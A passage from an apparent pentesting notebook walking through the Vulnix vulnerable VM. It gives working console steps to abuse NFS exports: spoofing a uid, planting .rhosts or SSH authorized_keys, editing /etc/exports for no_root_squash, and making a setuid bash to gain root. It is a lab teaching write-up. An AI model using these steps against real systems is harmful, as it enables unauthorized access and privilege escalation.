<span class="go">drwxr-x---  2 4294967294 4294967294 4096 Sep  2  2012 vulnix</span>

<span class="go">/mnt/home/vulnix:</span>
<span class="go">total 20</span>
<span class="go">drwxr-x--- 2 4294967294 4294967294 4096 Sep  2  2012 .</span>
<span class="go">drwxr-xr-x 4 4294967294 4294967294 4096 Sep  2  2012 ..</span>
<span class="go">-rw-r--r-- 1 4294967294 4294967294  220 Apr  3  2012 .bash_logout</span>
<span class="go">-rw-r--r-- 1 4294967294 4294967294 3486 Apr  3  2012 .bashrc</span>
<span class="go">-rw-r--r-- 1 4294967294 4294967294  675 Apr  3  2012 .profile</span>
<span class="gp">vulnix@kali:~$ #</span> and <span class="nb">local</span> vulnix user can write to the nfs share
<span class="gp">vulnix@kali:~$</span> <span class="nb">echo</span> hello &gt; /mnt/home/vulnix/hello.txt
<span class="gp">vulnix@kali:~$</span> chmod <span class="m">600</span> /mnt/home/vulnix/hello.txt
<span class="gp">vulnix@kali:~$</span> ls -l /mnt/home/vulnix/hello.txt
<span class="go">-rw------- 1 4294967294 4294967294 6 Apr 29 23:54 /mnt/home/vulnix/hello.txt</span>
<span class="gp">vulnix@kali:~$</span> <span class="nb">exit</span>
<span class="go">logout</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO umount /mnt
</pre></div>
</div>
</div>
<div class="section" id="mounting-nfs3-style">
<h4>3.20.3.1.4. Mounting nfs3 style<a class="headerlink" href="#mounting-nfs3-style" title="Permalink to this headline">¶</a></h4>
<p>So try an nfs3 mount where we eventually see uid/gid 2008/2008:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> mount -t nfs -o <span class="nv">vers</span><span class="o">=</span><span class="m">3</span>,nolock <span class="nv">$T</span>:/home/vulnix /mnt
ls -laR /mnt
su - vulnix
ls -laR /mnt
<span class="nb">exit</span>
<span class="nv">$SUDO</span> umount /mnt
</pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO mount -t nfs -o <span class="nv">vers</span><span class="o">=</span><span class="m">3</span>,nolock <span class="nv">$T</span>:/home/vulnix /mnt
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$</span> ls -laR /mnt
<span class="go">ls: cannot open directory /mnt: Permission denied</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$</span> su - vulnix
<span class="go">Password:</span>
<span class="gp">vulnix@kali:~$</span> ls -laR /mnt
<span class="go">/mnt:</span>
<span class="go">total 24</span>
<span class="go">drwxr-x---  2 vulnix vulnix 4096 Apr 29 23:54 .</span>
<span class="go">drwxr-xr-x 25 root   root   4096 Apr 28 21:01 ..</span>
<span class="go">-rw-r--r--  1 vulnix vulnix  220 Apr  3  2012 .bash_logout</span>
<span class="go">-rw-r--r--  1 vulnix vulnix 3486 Apr  3  2012 .bashrc</span>
<span class="go">-rw-------  1 vulnix vulnix    6 Apr 29 23:54 hello.txt</span>
<span class="go">-rw-r--r--  1 vulnix vulnix  675 Apr  3  2012 .profile</span>
<span class="gp">vulnix@kali:~$</span> <span class="nb">exit</span>
<span class="go">logout</span>
<span class="gp">hacker@kali:~/local/pentest/phouse/vulnix$ $</span>SUDO umount /mnt
</pre></div>
</div>
</div>
</div>
<div class="section" id="getting-access-the-easy-way-nfspysh-and-rsh">
<h3>3.20.3.2. Getting access the easy way: <code class="docutils literal"><span class="pre">nfspysh</span></code> and <code class="docutils literal"><span class="pre">rsh</span></code><a class="headerlink" href="#getting-access-the-easy-way-nfspysh-and-rsh" title="Permalink to this headline">¶</a></h3>
<p>Kali defaults <code class="docutils literal"><span class="pre">rsh</span></code> to running OpenSSL’s <code class="docutils literal"><span class="pre">ssh</span></code>; to use the “real” <code class="docutils literal"><span class="pre">rsh</span></code> install rsh-client:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">$SUDO</span> apt-get install rsh-client
<span class="nb">echo</span> <span class="s2">&quot;+ +&quot;</span> &gt; rhosts
<span class="nv">$SUDO</span> nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$IP</span>:/home/vulnix -c <span class="s1">&#39;put rhosts .rhosts; chmod 600 .rhosts&#39;</span>
</pre></div>
</div>
<p>That’s it! Now you have password-less access to the vulnix user account on the Vulnix server. So proceed with the exploit:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$ #</span> check remote vulnix user sudo rights
<span class="gp">(vulnix)hacker@kali:~$</span> rsh -l vulnix <span class="nv">$IP</span> <span class="s1">&#39;sudo -l&#39;</span>
<span class="go">Matching Defaults entries for vulnix on this host:</span>
<span class="go">    env_reset,</span>
<span class="go">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>

<span class="go">User vulnix may run the following commands on this host:</span>
<span class="go">    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span>
<span class="gp">(vulnix)hacker@kali:~$</span> rsh -l vulnix <span class="nv">$IP</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">vulnix@vulnix:~$ #</span> vulnix can edit /etc/exports, so <span class="nb">export</span> /root
<span class="gp">vulnix@vulnix:~$</span> sudoedit /etc/exports
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">vulnix@vulnix:~$</span> cat /etc/exports
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">/home/vulnix  *(rw,no_root_squash)</span>
<span class="go">/root         *(rw,no_root_squash)</span>
<span class="gp">vulnix@vulnix:~$</span> <span class="nb">exit</span>
<span class="go">logout</span>
<span class="go">rlogin: connection closed.</span>
<span class="gp">(vulnix)hacker@kali:~$ #</span> now we need to restart nfs by rebooting the VM
<span class="gp">(vulnix)hacker@kali:~$ #</span> ... waiting <span class="k">for</span> reboot ...
</pre></div>
</div>
<p>After the Vulnix reboot:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$IP</span>:/root -c <span class="s1">&#39;ls&#39;</span>
<span class="go">/:</span>
<span class="go">040700      0      0        4096 2012-09-02 10:58:01 .cache</span>
<span class="go">100600      0      0         710 2012-09-02 10:47:19 .viminfo</span>
<span class="go">040700      0      0        4096 2012-09-02 12:08:28 .</span>
<span class="go">100400      0      0          33 2012-09-02 10:57:07 trophy.txt</span>
<span class="go">100644      0      0         140 2012-04-19 02:15:14 .profile</span>
<span class="go">100600      0      0           0 2012-09-02 12:08:28 .bash_history</span>
<span class="go">040700      0      0        4096 2012-09-02 12:08:28 ..</span>
<span class="go">100644      0      0        3106 2012-04-19 02:15:14 .bashrc</span>
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO nfspysh -o <span class="nv">server</span><span class="o">=</span><span class="nv">$IP</span>:/root -c <span class="s1">&#39;get trophy.txt&#39;</span>
<span class="gp">(vulnix)hacker@kali:~$</span> cat trophy.txt
<span class="go">cc614640424f5bd60ce5d5264899c3be</span>
</pre></div>
</div>
<p>At this point if you want to clean up you’d need to:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> !<span class="o">=</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> deactivate
<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> !<span class="o">=</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> rmvirtualenv vulnix
<span class="nv">$SUDO</span> apt-get remove rsh-client -y
</pre></div>
</div>
</div>
<div class="section" id="getting-access-and-root-the-harder-way-mount-nfs-and-ssh">
<h3>3.20.3.3. Getting access (and root) the harder way: <code class="docutils literal"><span class="pre">mount.nfs</span></code> and <code class="docutils literal"><span class="pre">ssh</span></code><a class="headerlink" href="#getting-access-and-root-the-harder-way-mount-nfs-and-ssh" title="Permalink to this headline">¶</a></h3>
<p>This is basically the same exploit as above with the exception of using <code class="docutils literal"><span class="pre">ssh</span></code> vs. <code class="docutils literal"><span class="pre">rsh</span></code> and not using the <code class="docutils literal"><span class="pre">nfspysh</span></code> tool (and using the normal <code class="docutils literal"><span class="pre">mount.nfs</span></code> command). Why bother? Normally <code class="docutils literal"><span class="pre">rsh</span></code> wouldn’t be installed (just like Kali Linux), so it shouldn’t be available on target hosts. And <code class="docutils literal"><span class="pre">nfspysh</span></code> wouldn’t be available on typical linux hosts (like Debian). So it’s useful to learn the “normal” alternative approach.</p>
<p>Here upload the <code class="file docutils literal"><span class="pre">.ssh/authorized_keys</span></code> file to get password-less SSH access; as before <code class="docutils literal"><span class="pre">sudo</span> <span class="pre">-l</span></code> shows vulnix can execute <code class="docutils literal"><span class="pre">sudoedit</span> <span class="pre">/etc/exports</span></code>; then <code class="file docutils literal"><span class="pre">/etc/exports</span></code> is modified to add <code class="file docutils literal"><span class="pre">/root</span></code> and all mounts are changed to <code class="docutils literal"><span class="pre">no_root_squash</span></code> finally giving us access to the trophy. This approach is more complex for two reasons: first, SSH keys must be generated; second <code class="docutils literal"><span class="pre">mount.nfs</span></code> access requires a Kali local account with uid 2008 to get access. Also, we’ll show how to get root through the NFS configuration issue.</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$</span> /sbin/showmount -e <span class="nv">$IP</span>
<span class="go">Export list for 192.168.1.103:</span>
<span class="go">/home/vulnix *</span>
<span class="gp">(vulnix)hacker@kali:~$ #</span> Trying nfs mount gets nfs4 and no access
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO mkdir /mnt/nfs
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO mount.nfs  <span class="nv">$IP</span>:/ /mnt/nfs
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO ls -l /mnt/nfs/home/
<span class="go">total 4</span>
<span class="go">drwxr-x--- 2 4294967294 4294967294 4096 Apr 15 23:14 vulnix</span>
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO ls -al /mnt/nfs/home/vulnix
<span class="go">ls: cannot open directory /mnt/nfs/home/vulnix: Permission denied</span>
<span class="gp">(vulnix)hacker@kali:~$ #</span> create <span class="nb">local</span> copy of remote vulnix user
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO groupadd --gid <span class="m">2008</span> vulnix
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO useradd -m vulnix --uid <span class="m">2008</span> --gid <span class="m">2008</span>
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO passwd vulnix
<span class="go">Enter new UNIX password:</span>
<span class="go">Retype new UNIX password:</span>
<span class="go">passwd: password updated successfully</span>
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO chsh -s /bin/bash vulnix
<span class="gp">(vulnix)hacker@kali:~$</span> su - vulnix
<span class="go">Password:</span>
<span class="gp">vulnix@kali:~$ #</span> <span class="nb">local</span> <span class="s2">&quot;vulnix&quot;</span> uid <span class="m">2008</span> can access nfs /home/vulnix
<span class="gp">vulnix@kali:~$</span> ls -al /mnt/nfs/home/vulnix
<span class="go">total 20</span>
<span class="go">drwxr-x--- 2 4294967294 4294967294 4096 Apr 15 23:14 .</span>
<span class="go">drwxr-xr-x 4 4294967294 4294967294 4096 Sep  2  2012 ..</span>
<span class="go">-rw-r--r-- 1 4294967294 4294967294  220 Apr  3  2012 .bash_logout</span>
<span class="go">-rw-r--r-- 1 4294967294 4294967294 3486 Apr  3  2012 .bashrc</span>
<span class="go">-rw-r--r-- 1 4294967294 4294967294  675 Apr  3  2012 .profile</span>
<span class="gp">vulnix@kali:~$ #</span> create ssh keys <span class="k">for</span> password-less access from kali
<span class="gp">vulnix@kali:~$</span> ssh-keygen
<span class="go">Generating public/private rsa key pair.</span>
<span class="go">Enter file in which to save the key (/home/vulnix/.ssh/id_rsa):</span>
<span class="go">Created directory &#39;/home/vulnix/.ssh&#39;.</span>
<span class="go">Enter passphrase (empty for no passphrase):</span>
<span class="go">Enter same passphrase again:</span>
<span class="go">Your identification has been saved in /home/vulnix/.ssh/id_rsa.</span>
<span class="go">Your public key has been saved in /home/vulnix/.ssh/id_rsa.pub.</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">vulnix@kali:~$</span> mkdir -m <span class="m">700</span> /mnt/nfs/home/vulnix/.ssh
<span class="gp">vulnix@kali:~$</span> ls -ld /mnt/nfs/home/vulnix/.ssh
<span class="go">drwx------ 2 4294967294 4294967294 4096 Apr 18 13:37 /mnt/nfs/home/vulnix/.ssh</span>
<span class="gp">vulnix@kali:~$</span> cp --preserve ~/.ssh/id_rsa.pub /mnt/nfs/home/vulnix/.ssh/authorized_keys
<span class="gp">vulnix@kali:~$</span> <span class="nv">IP</span><span class="o">=</span><span class="m">192</span>.168.1.103
<span class="gp">vulnix@kali:~$ ssh $</span>IP ls -al .ssh
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">total 20</span>
<span class="go">drwx------ 2 vulnix vulnix 4096 Apr 16 21:05 .</span>
<span class="go">drwxr-x--- 4 vulnix vulnix 4096 Apr 16 21:07 ..</span>
<span class="go">-rw-r--r-- 1 vulnix vulnix  393 Apr 16 20:42 authorized_keys</span>
<span class="gp">vulnix@kali:~$ #</span> check remote vulnix user sudo rights
<span class="gp">vulnix@kali:~$ ssh $</span>IP sudo -l
<span class="go">Matching &#39;Defaults&#39; entries for vulnix on this host:</span>
<span class="go">    env_reset,</span>
<span class="go">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span>

<span class="go">User vulnix may run the following commands on this host:</span>
<span class="go">    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports</span>
<span class="gp">vulnix@kali:~$ #</span> vulnix can edit /etc/exports - <span class="nb">export</span> /root, all exports no_root_squash
<span class="gp">vulnix@kali:~$</span> ssh -t <span class="nv">$IP</span> sudoedit /etc/exports
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">vulnix@kali:~$</span> ssh -t <span class="nv">$IP</span> cat /etc/exports
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">/home/vulnix  *(rw,no_root_squash)</span>
<span class="go">/root         *(rw,no_root_squash)</span>
<span class="gp">vulnix@kali:~$</span> <span class="nb">exit</span>
<span class="go">logout</span>
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO umount.nfs /mnt/nfs
<span class="gp">(vulnix)hacker@kali:~$ #</span> now we need to restart nfs by rebooting the VM
<span class="gp">(vulnix)hacker@kali:~$ #</span> ... waiting <span class="k">for</span> reboot ...
</pre></div>
</div>
<p>At this point we can do one of two things: get the trophy from /root, or switch to root. First we show how to get the trophy:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO mount.nfs <span class="nv">$IP</span>:/ /mnt/nfs
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO ls /mnt/nfs/root
<span class="go">trophy.txt</span>
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO cat /mnt/nfs/root/trophy.txt
<span class="go">cc614640424f5bd60ce5d5264899c3be</span>
</pre></div>
</div>
<p>At this point we’ll throw in an extra: root access for vulnix.</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">(vulnix)hacker@kali:~$</span> su - vulnix
<span class="go">Password:</span>
<span class="gp">vulnix@kali:~$</span> <span class="nv">IP</span><span class="o">=</span><span class="m">192</span>.168.1.103
<span class="gp">vulnix@kali:~$ ssh $</span>IP <span class="s1">&#39;cp /bin/bash bash2&#39;</span>
<span class="gp">vulnix@kali:~$ ssh $</span>IP ls -l
<span class="go">total 900</span>
<span class="go">-rwxr-xr-x 1 vulnix vulnix 920788 Apr 18 22:04 bash2</span>
<span class="gp">vulnix@kali:~$</span> <span class="nb">exit</span>
<span class="go">logout</span>
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO cp  /mnt/nfs/home/vulnix/bash2 /mnt/nfs/home/vulnix/bash
<span class="gp">(vulnix)hacker@kali:~$ $</span>SUDO chmod +s /mnt/nfs/home/vulnix/bash
<span class="gp">(vulnix)hacker@kali:~$</span> su - vulnix
<span class="go">Password:</span>
<span class="gp">vulnix@kali:~$</span> <span class="nv">IP</span><span class="o">=</span><span class="m">192</span>.168.1.103
<span class="gp">vulnix@kali:~$ ssh $</span>IP
<span class="gp">vulnix@vulnix:~$</span> ./bash -p
<span class="go">bash-4.2# id</span>
<span class="go">uid=2008(vulnix) gid=2008(vulnix) euid=0(root) egid=0(root) groups=0(root),2008(vulnix)</span>
<span class="go">bash-4.2# ls -l</span>
<span class="go">total 1800</span>
<span class="go">-rwsr-sr-x 1 root   root   920788 Apr 18 22:09 bash</span>
<span class="go">-rwxr-xr-x 1 vulnix vulnix 920788 Apr 18 22:04 bash2</span>
<span class="go">bash-4.2# cat /root/trophy.txt</span>
<span class="go">cc614640424f5bd60ce5d5264899c3be</span>
</pre></div>
</div>
<p>At this point if you want to clean up you’d need to:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>bash-4.2# <span class="nb">exit</span>
<span class="nb">exit</span>
vulnix@vulnix:~$ <span class="nb">exit</span>
<span class="nb">logout</span>
Connection to <span class="m">192</span>.168.1.103 closed.
vulnix@kali:~$ <span class="nb">exit</span>
<span class="nb">logout</span>
<span class="o">(</span>vulnix<span class="o">)</span>hacker@kali:~$ <span class="nv">$SUDO</span> umount.nfs /mnt/nfs
<span class="o">(</span>vulnix<span class="o">)</span>hacker@kali:~$ <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> !<span class="o">=</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> deactivate
hacker@kali:~$ <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> !<span class="o">=</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> rmvirtualenv vulnix
Removing vulnix...
hacker@kali:~$ <span class="nv">$SUDO</span> userdel -r vulnix
userdel: vulnix mail spool <span class="o">(</span>/var/mail/vulnix<span class="o">)</span> not found
hacker@kali:~$ <span class="nv">$SUDO</span> rmdir /mnt/nfs
</pre></div>
</div>
</div>
</div>
</div>


           </div>
           <div class="articleComments">
            
           </div>
          </div>
          <footer>
  
    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
      
        <a href="googles_xss_game.html" class="btn btn-neutral float-right" title="3.21. Google’s XSS Game" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
      
      
        <a href="zorz.html" class="btn btn-neutral" title="3.19. ZorZ" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
      
    </div>
  

  <hr/>

  <div role="contentinfo">
    <p>
        &copy; Copyright 2017, bitbender.

    </p>
  </div>
  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 

</footer>

        </div>
      </div>

    </section>

  </div>
  


  

    <script type="text/javascript">
        var DOCUMENTATION_OPTIONS = {
            URL_ROOT:'../',
            VERSION:'1.0.2',
            COLLAPSE_INDEX:false,
            FILE_SUFFIX:'.html',
            HAS_SOURCE:  true,
            SOURCELINK_SUFFIX: '.txt'
        };
    </script>
      <script type="text/javascript" src="../_static/jquery.js"></script>
      <script type="text/javascript" src="../_static/underscore.js"></script>
      <script type="text/javascript" src="../_static/doctools.js"></script>
      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>

  

  
  
    <script type="text/javascript" src="../_static/js/theme.js"></script>
  

  
  
  <script type="text/javascript">
      jQuery(function () {
          SphinxRtdTheme.StickyNav.enable();
      });
  </script>
   

</body>
</html>